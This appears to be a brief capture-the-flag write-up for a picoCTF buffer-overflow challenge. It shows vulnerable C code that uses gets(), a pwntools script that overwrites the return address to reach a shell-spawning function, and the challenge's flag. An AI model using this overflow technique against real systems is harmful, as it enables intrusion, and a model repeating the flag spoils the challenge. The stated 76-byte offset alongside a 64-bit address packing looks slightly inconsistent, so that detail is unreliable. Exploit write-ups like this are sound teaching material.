# PicoCTF: Binary Bop

## Challenge Description
Can you overflow the buffer and get the flag?

## Analysis
We are provided with a binary and its source code.

\`\`\`c
void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    gets(buf);
}
\`\`\`

The `gets()` function is vulnerable to buffer overflow.

## Exploitation
We need to overwrite the return address of `vuln()` to point to `win()`.

Using `gdb`, we find the offset to be 76 bytes.

\`\`\`python
from pwn import *

p = process('./vuln')
payload = b'A' * 76 + p64(0x401146) # Address of win()
p.sendline(payload)
p.interactive()
\`\`\`

Running the script gives us a shell!

## Flag
`picoCTF{b0p_b0p_b0p_fl4g}`
